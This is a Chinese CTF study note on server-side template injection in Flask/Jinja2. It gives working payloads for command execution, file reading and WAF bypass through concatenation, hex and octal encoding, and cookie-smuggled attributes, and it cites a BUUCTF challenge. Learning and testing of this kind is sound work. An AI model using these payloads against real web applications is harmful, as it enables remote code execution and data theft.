---
title: 【WEB】SSTI
---

# SSTI

SSTI为模板注入，以下皆为 Python3 环境

首先由于模板解析的特性，当使用 render_template_string 则可以通过各个类之间的调用造成命令执行

```
render_template_string("{{1+1}}")
```

这一解析方法时就会把输入的内容直接放入页面解析，通常的检测方法为 

```
{{1+1}}
```

返回的是 2，这也说明其中的内容被执行。

而安全的方法是

```
render_template("{{1+1}}")
```

返回的是 

```
{{1+1}}
```



## 利用方法

通常是通过某一对象向上寻找基类，进而使用包含某些特殊方法的类，并调用其中的危险函数来执行命令

以下为 flask 的常见可用类

```
75 <class '_frozen_importlib._ModuleLock'>
76 <class '_frozen_importlib._DummyModuleLock'>
77 <class '_frozen_importlib._ModuleLockManager'>
78 <class '_frozen_importlib._installed_safely'>
79 <class '_frozen_importlib.ModuleSpec'>
91 <class '_frozen_importlib_external.FileLoader'>
92 <class '_frozen_importlib_external._NamespacePath'>
93 <class '_frozen_importlib_external._NamespaceLoader'>
95 <class '_frozen_importlib_external.FileFinder'>
103 <class 'codecs.IncrementalEncoder'>
104 <class 'codecs.IncrementalDecoder'>
105 <class 'codecs.StreamReaderWriter'>
106 <class 'codecs.StreamRecoder'>
128 <class 'os._wrap_close'>
129 <class '_sitebuiltins.Quitter'>
130 <class '_sitebuiltins._Printer'>
```

当确定存在模板注入后就是先寻找可用类

```
{{''.__class__.__mro__[1].__subclasses__()}}

__class__ 返回调用的参数类型
__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组
__subclasses__() 返回object的子类
```

class 返回 str 类，str的基类是 object类，之后返回object的子类，就可以实现多种方法

例如命令执行：

```
{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

文件读取：

```
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']('/this_is_the_flag.txt').read()}}
```



## WAF绕过

很多 Python 中的语法在 SSTI 中也都是可以用的

attr 用于获取变量，以下写法是相同的

```
""|attr("__class__")
"".__class__
```

获取数组参数可以使用

```
__gititem__()
__gititem__(数组下标)
__gititem__("key")
```

绕过双引号可以使用

 ```
request.cookies.参数名
request.args.参数名
 ```

比如通过 + 进行拼接绕过关键字，也可以使用 “” 进行拼接，或者 `"str1".__add__("str2")` 的方式

```
{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").pop'+'en("ls").read()')}}
{{[].__class__.__base__.__subclasses__()[75].__init__.__globals__.__builtins__["open"]("/fl""ag").read()}}
{{app.__init__.__globals__["__buil".__add__("tins__")].open("/fla".__add__("g")).read()}}
```

通过十六进制绕过 . 和 _

```
{{''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[342]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('os')["popen"]("ls")["read"]()}}
```

或者在无回显的时候进行盲注 `177 threading.Semaphore`

```
{% if ''.__class__.__mro__[-1].__subclasses__()[177].__init__.__globals__['__bui'+'ltins__']['open']('/app/flag').read()[0:1]=='f' %}xxx{% endif %}
```

也有特殊的可用类 `<class 'subprocess.Popen'>` 直接执行命令

```
{{''.__class__.__mro__[-1].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```

或者利用 getattr 进行沙箱逃逸

```
getattr(getattr(getattr(getattr(getattr(getattr(getattr([],'__cla'+'ss__'),'__mr'+'o__')[1],'__subclas'+'ses__')()[104],'__init__'),'__glob'+'al'+'s__')['sy'+'s'],'mod'+'ules')['o'+'s'],'sy'+'ste'+'m')('l'+'s')
```

和利用八进制绕过

```
{%print%0a(lipsum|attr("\137\137\147\154\157\142\141\154\163\137\137"))|attr("\137\137\147\145\164\151\164\145\155\137\137")("\137\137\142\165\151\154\164\151\156\163\137\137")|attr("\137\137\147\145\164\151\164\145\155\137\137")("\145\166\141\154")("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\160\157\160\145\156\50\47\143\141\164\40\57\146\154\141\147\47\51\56\162\145\141\144\50\51")%}
```

利用 attr 和 request 绕过

```
{{()|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)()|attr(request.cookies.x4)(78)|attr(request.cookies.x5)|attr(request.cookies.x6)|attr(request.cookies.x4)(request.cookies.x7)|attr(request.cookies.x4)(request.cookies.x9)(request.cookies.x10)}}
Cookie: x1=__class__; x2=__base__; x3=__subclasses__; x4=__getitem__; x5=__init__; x6=__globals__; x7=__builtins__; x8=__getitem__; x9=eval; x10=__import__("os").popen("cat flag.txt").read();
```



## 其他方法

查看对象属性

```
(对象名).func_globals  
(对象名).__code__.co_consts 
(对象名).__code__.co_names
(对象名).__dict__
(对象名).__globals__
```



## 相关题目

BUUCTF		[BJDCTF 2nd]fake google